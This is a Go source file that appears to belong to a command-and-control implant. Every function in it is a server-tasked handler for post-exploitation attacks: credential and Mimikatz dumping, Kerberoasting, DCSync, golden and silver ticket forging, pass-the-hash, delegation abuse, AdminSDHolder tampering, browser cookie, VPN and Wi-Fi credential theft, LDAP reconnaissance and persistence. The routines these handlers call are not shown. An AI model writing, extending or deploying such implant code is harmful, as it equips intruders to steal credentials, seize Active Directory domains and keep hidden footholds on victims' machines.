//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"runtime"
	"strings"
)

func handleCreds(task Task, res *TaskResult) {
	out, err := dumpCreds()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleMimikatz(task Task, res *TaskResult) {
	// Optional task.Data: base64 of Invoke-Mimikatz.ps1 from server module store
	out, err := runMimikatz(task.Command, task.Data)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleKerberoast(task Task, res *TaskResult) {
	out, err := kerberoast()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(convertKerberoastResult(out)))
		res.Encoding = "base64"
	}
}

func handleDPAPIMasterKey(task Task, res *TaskResult) {
	out, err := dpapiMasterKey()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleDPAPIBlob(task Task, res *TaskResult) {
	out, err := dpapiBlob(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleDPAPIBrowser(task Task, res *TaskResult) {
	out, err := dpapiBrowser()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleLSABypass(task Task, res *TaskResult) {
	out, err := lsaBypass()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleADCSFind(task Task, res *TaskResult) {
	out, err := adcsFind()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleADCSRequest(task Task, res *TaskResult) {
	out, err := adcsRequest(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleShadowCreds(task Task, res *TaskResult) {
	out, err := shadowCreds(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleDCSync(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "dcsync is Windows-only"
		return
	}
	out, err := kerberosDCSync(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleGoldenTicket(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "golden_ticket is Windows-only"
		return
	}
	parts := strings.SplitN(task.Command, "|", 4)
	if len(parts) < 4 {
		res.Error = "format: user|domain|sid|krbtgt_hash"
		return
	}
	out, err := kerberosGoldenTicket(parts[0], parts[1], parts[2], parts[3])
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleSilverTicket(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "silver_ticket is Windows-only"
		return
	}
	parts := strings.SplitN(task.Command, "|", 5)
	if len(parts) < 5 {
		res.Error = "format: user|domain|sid|target|rc4_hash"
		return
	}
	out, err := kerberosSilverTicket(parts[0], parts[1], parts[2], parts[3], parts[4])
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleASREPRoast(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "asreproast is Windows-only"
		return
	}
	out, err := kerberosASREPRoast(task.Data)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handlePassTheHash(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "pass_the_hash is Windows-only"
		return
	}
	parts := strings.SplitN(task.Command, "|", 4)
	if len(parts) < 3 {
		res.Error = "format: user|domain|ntlm_hash[|target]"
		return
	}
	target := ""
	if len(parts) > 3 {
		target = parts[3]
	}
	out, err := kerberosPassTheHash(parts[0], parts[1], parts[2], target)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleFindDelegation(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "find_delegation is Windows-only"
		return
	}
	hosts, err := findUnconstrainedDelegation()
	if err != nil {
		res.Error = err.Error()
		return
	}
	out := "Unconstrained Delegation Targets:\n"
	for _, h := range hosts {
		out += "  " + h + "\n"
	}
	if len(hosts) == 0 {
		out += "  (none found)\n"
	}
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}

func handleConstrainedDeleg(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "constrained_deleg is Windows-only"
		return
	}
	parts := strings.SplitN(task.Command, "|", 2)
	if len(parts) < 2 {
		res.Error = "format: userPrincipal|targetSPN"
		return
	}
	out, err := abuseConstrainedDelegation(parts[0], parts[1])
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString(out)
		res.Encoding = "base64"
	}
}

func handleRBCD(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "rbcd is Windows-only"
		return
	}
	parts := strings.SplitN(task.Command, "|", 3)
	if len(parts) < 3 {
		res.Error = "format: targetComputer|attackerComputer|domainAdmin"
		return
	}
	err := abuseRBCD(parts[0], parts[1], parts[2])
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte("RBCD abuse completed"))
		res.Encoding = "base64"
	}
}

func handleBronzeBit(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "bronze_bit is Windows-only"
		return
	}
	parts := strings.SplitN(task.Command, "|", 2)
	if len(parts) < 2 {
		res.Error = "format: targetSPN|userPrincipal"
		return
	}
	out, err := bronzeBitAttack(parts[0], parts[1])
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString(out)
		res.Encoding = "base64"
	}
}

func handleAdminSDHolder(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "adminsdholder is Windows-only"
		return
	}
	err := modifyAdminSDHolder(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte("AdminSDHolder modified"))
		res.Encoding = "base64"
	}
}

func handleDCSyncMachine(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "dcsync_machine is Windows-only"
		return
	}
	parts := strings.SplitN(task.Command, "|", 3)
	if len(parts) < 2 {
		res.Error = "format: domain|targetUser[|dcIP]"
		return
	}
	dcIP := ""
	if len(parts) > 2 {
		dcIP = parts[2]
	}
	out, err := dcsyncMachineAccount(parts[0], parts[1], dcIP)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString(out)
		res.Encoding = "base64"
	}
}

func handlePassTheTicket(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "pass_the_ticket is Windows-only"
		return
	}
	out, err := kerberosPassTheTicket(task.Data)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
		res.Encoding = "base64"
	}
}

func handleBrowserSteal(task Task, res *TaskResult) {
	out := stealBrowserData(task.Command)
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}

func handleCookieExport(task Task, res *TaskResult) {
	browser := task.Command
	if browser == "" {
		browser = "all"
	}
	out := exportCookies(browser)
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}

func handleVpnCreds(task Task, res *TaskResult) {
	out := exportVpnCreds()
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}

func handleWifiCreds(task Task, res *TaskResult) {
	out := exportWifiCreds()
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}

func handleRemoteInput(task Task, res *TaskResult) {
	payload := task.Data
	if payload == "" {
		payload = task.Command
	}
	res.Output = remoteInputDispatch(payload)
}

func handleLDAPUsers(task Task, res *TaskResult) {
	out, err := ldapUsers()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleLDAPGroups(task Task, res *TaskResult) {
	out, err := ldapGroups()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleLDAPComputers(task Task, res *TaskResult) {
	out, err := ldapComputers()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleLDAPSPN(task Task, res *TaskResult) {
	out, err := ldapSPN()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleLDAPACL(task Task, res *TaskResult) {
	out, err := ldapACL()
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

func handleLDAPQuery(task Task, res *TaskResult) {
	out, err := ldapQuery(task.Command)
	if err != nil {
		res.Error = err.Error()
	} else {
		res.Output = out
	}
}

// ── Persistence ──────────────────────────────────────────────────────────

func handlePersistenceAdd(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 2)
	method := parts[0]
	args := ""
	if len(parts) > 1 {
		args = parts[1]
	}
	res.Output = applyPersistence(method, args)
}

func handlePersistenceList(task Task, res *TaskResult) {
	res.Output = listPersistence()
}

func handlePersistenceRemove(task Task, res *TaskResult) {
	parts := strings.SplitN(task.Command, "|", 2)
	method := parts[0]
	args := ""
	if len(parts) > 1 {
		args = parts[1]
	}
	res.Output = removePersistence(method, args)
}
